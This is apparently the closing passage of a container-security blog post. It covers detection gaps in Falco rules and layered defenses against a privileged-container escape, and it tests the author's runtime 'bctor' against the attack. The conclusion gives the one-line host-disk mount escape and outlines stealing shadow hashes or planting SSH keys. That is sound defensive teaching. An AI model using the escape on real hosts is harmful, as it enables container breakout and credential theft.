## Detection gaps

What the rule does and does not cover:

- It fires on `mount` of a path matching a host block device, on syscall exit, before the attacker has read or written anything through it. There is no check on the return value, so a mount that was denied alerts as well, which is what you want from an attempted escape.
- The companion rule covers the raw `open` of the device, so the `dd`, `grep`, and `debugfs` variants are caught too, since all of them open `/dev/sda1`. Its reach depends on the `open_read` and `open_write` macros, which resolve the open flags, and on the probe emitting the syscall at all. A tool reaching the device through `openat2` on a build without that event, or through an inherited file descriptor, leaves no match.
- The rule matches the device string Falco sees, so it is only as complete as its prefix list. The list above covers SCSI/SATA, virtio, NVMe, Xen, device-mapper, MD RAID and eMMC. It leaves out `/dev/loop`, deliberately, because loop mounts are common and mostly benign, and a host image file reached through one is a different technique. Anything on the host with a name outside the list is uncovered.
- None of this stops the escape, since Falco alerts after the syscall has already run.

---

# Defend

## The single misconfiguration

Everything traces back to `--privileged`. Remove it and every gate from the threat model closes at once: no `CAP_SYS_ADMIN`, which also makes the default seccomp profile refuse `mount`, an AppArmor profile denying `mount` on its own, a tight device allowlist, and no host block devices in `/dev`. The first defense is the obvious one, do not run privileged containers, and most workloads never need it.

But "do not misconfigure it" is not a control. Defense in depth means the escape should fail even when one layer is wrong. Each of the following breaks it on its own.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 382" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Layered defenses. no --privileged closes every gate. seccomp denying mount blocks it at syscall entry. AppArmor deny mount rejects it inside the syscall. drop CAP_SYS_ADMIN denies mount with EPERM. an own user namespace makes an ext4 mount impossible. a tight device allowlist blocks opening the host disk. an empty /dev with CAP_MKNOD dropped leaves no device node and no way to make one.">
  <rect x="10" y="10" width="860" height="362" rx="10" fill="#1c2027" stroke="#3a4048" stroke-width="1.5"/>
  <text x="34" y="42" fill="#8a929c" font-size="12" font-weight="700" letter-spacing="1">CONTROL</text>
  <text x="360" y="42" fill="#8a929c" font-size="12" font-weight="700" letter-spacing="1">EFFECT ON THIS ESCAPE</text>
  <line x1="24" y1="56" x2="856" y2="56" stroke="#3a4048" stroke-width="1"/>
  <line x1="342" y1="56" x2="342" y2="360" stroke="#3a4048" stroke-width="1"/>
  <g font-family="monospace" font-size="12.5">
    <rect x="24" y="66" width="318" height="42" fill="#20252d"/>
    <text x="34" y="92" fill="#d17bd0" font-weight="700">no --privileged</text>
    <text x="360" y="92" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">closes every gate at once</text>

    <text x="34" y="134" fill="#d17bd0" font-weight="700">seccomp denies mount</text>
    <text x="360" y="134" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">stopped at syscall entry, before the capability check</text>

    <rect x="24" y="150" width="318" height="42" fill="#20252d"/>
    <text x="34" y="176" fill="#d17bd0" font-weight="700">AppArmor deny mount</text>
    <text x="360" y="176" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">rejected inside the syscall by the LSM</text>

    <text x="34" y="218" fill="#d17bd0" font-weight="700">drop CAP_SYS_ADMIN</text>
    <text x="360" y="218" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">mount() denied with EPERM</text>

    <rect x="24" y="234" width="318" height="42" fill="#20252d"/>
    <text x="34" y="260" fill="#d17bd0" font-weight="700">own user namespace</text>
    <text x="360" y="260" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">ext4 lacks FS_USERNS_MOUNT, no mount possible</text>

    <text x="34" y="302" fill="#d17bd0" font-weight="700">tight device allowlist</text>
    <text x="360" y="302" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">host disk cannot be opened</text>

    <rect x="24" y="318" width="318" height="42" fill="#20252d"/>
    <text x="34" y="344" fill="#d17bd0" font-weight="700">empty /dev + no CAP_MKNOD</text>
    <text x="360" y="344" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">no device node, and none can be created</text>
  </g>
  <g stroke="#282e37" stroke-width="1">
    <line x1="24" y1="108" x2="856" y2="108"/><line x1="24" y1="150" x2="856" y2="150"/>
    <line x1="24" y1="192" x2="856" y2="192"/><line x1="24" y1="234" x2="856" y2="234"/>
    <line x1="24" y1="276" x2="856" y2="276"/><line x1="24" y1="318" x2="856" y2="318"/>
  </g>
  <g>
    <circle cx="838" cy="87"  r="7" fill="#153a1e"/><path d="M834,87  l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="129" r="7" fill="#153a1e"/><path d="M834,129 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="171" r="7" fill="#153a1e"/><path d="M834,171 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="213" r="7" fill="#153a1e"/><path d="M834,213 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="255" r="7" fill="#153a1e"/><path d="M834,255 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="297" r="7" fill="#153a1e"/><path d="M834,297 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="339" r="7" fill="#153a1e"/><path d="M834,339 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
  </g>
</svg>
</div>

To land this escape an attacker needs to open the host device and then `mount` it. Take away the ability to open it (device allowlist, empty `/dev`) or the ability to mount it (seccomp, AppArmor, `CAP_SYS_ADMIN`, a user namespace) and the chain breaks.

Two things are worth spelling out. An empty `/dev` holds only while `CAP_MKNOD` is gone, since that capability recreates the node from its major:minor numbers, which is why the last row pairs them. A read-only rootfs belongs nowhere on this list. `mount(2)` needs its target directory to exist, and `/mnt`, `/opt`, `/media` or any tmpfs already in the image serves as one.

## Defaults done right

This is the reason the series exists, so here is [bctor](https://github.com/Johnermac/bctor), my from-scratch container runtime, against the same attack. Its design rule is that every isolation control is on by default and weakening it has to be an explicit opt-in.

I ran the exact recon and escape one-liner inside a default bctor container. The output, unedited:

```sh
---DEV
crw-rw-rw- 1 0 0 1, 3 null
crw-rw-rw- 1 0 0 1, 9 urandom
crw-rw-rw- 1 0 0 1, 5 zero
---SDX
ls: /dev/sd*: No such file or directory
---CAPS
CapEff:     0000000000000000
NoNewPrivs: 1
---MOUNT
mkdir: can't create directory '/mnt/': Read-only file system
Bad system call (core dumped)
rc=159
```

Read from the bottom up, that is three configured walls and one structural:

- `mount` returns `Bad system call` and the process dies with exit `159`. That is `128 + 31`, signal `SIGSYS`: bctor's seccomp profile does not list `mount`, so the kernel kills the call before it runs. This wall stops the escape on its own.
- `CapEff: 0000000000000000`. Every capability is dropped, so even without seccomp there is no `CAP_SYS_ADMIN` to authorize `mount` and no `CAP_MKNOD` to recreate a node.
- `/dev` holds `null`, `zero`, and `urandom` and nothing else. There is no host block device to target, and with `CAP_MKNOD` gone none can be created.
- the container runs in its own user namespace, and the `FS_USERNS_MOUNT` rule from earlier makes that decisive: `ext4` cannot be mounted from a nested user namespace whatever the capabilities say. This one holds even if the other three are configured away.

The `mkdir` failure in that output shows the read-only rootfs working, and it stops nothing here: the tmpfs mounts bctor puts on `/tmp`, `/run` and `/var` would each have served as a mount target.

None of the four can be turned off without an explicit flag.

> [!] bctor mounts the container's own root and pivots into it during setup, which does need `mount`. That happens in the init stage, before the seccomp filter is installed on the workload. Setup can mount, the workload cannot. This is the usual pattern: do the privileged work early, then drop everything before running user code.

One honest note: bctor does not yet implement a cgroup v2 device allowlist. What removes the device here is the empty `/dev` and the dropped capabilities. The eBPF device program would add another independent layer, and it is on the roadmap, but I am not going to claim a control the code does not have yet.

---

# Conclusion

- The attack is one line, `mount /dev/sda1 /mnt/host`, once you see that the host root disk is a block device sitting in the container's `/dev` and that `--privileged` opens the device allowlist along with every check in front of `mount`. What follows is just read and write on the host filesystem: shadow hashes out, an SSH key or a `chroot` in.
- The detection is the same lesson as the last post. Default rules missed the `mount` and the `dd`/`grep` reads, and only caught `debugfs` by luck, because it happens to have its own stock rule. Reliable detection watches the mechanism, the mount and the block-device open, which covers every tool the attacker might reach for.
- The defense is layered. Seccomp, AppArmor, `CAP_SYS_ADMIN`, a user namespace and the device allowlist each break the chain alone. An empty `/dev` needs `CAP_MKNOD` dropped beside it.

> Next in the series I will take another escape through the same attack, detect, defend cycle.

Check the repo: [BCTOR GITHUB REPO](https://github.com/Johnermac/bctor)

> Follow me if this was useful. Hope you liked it! :)

# References

https://man7.org/linux/man-pages/man2/mount.2.html

https://man7.org/linux/man-pages/man7/user_namespaces.7.html

https://man7.org/linux/man-pages/man7/capabilities.7.html

https://man7.org/linux/man-pages/man8/debugfs.8.html

https://github.com/moby/moby/blob/master/profiles/seccomp/default.json

https://github.com/moby/moby/blob/master/profiles/apparmor/template.go

https://docs.kernel.org/admin-guide/cgroup-v1/devices.html

https://docs.kernel.org/admin-guide/cgroup-v2.html

https://falco.org/docs/reference/rules/default-rules/

https://attack.mitre.org/techniques/T1611/
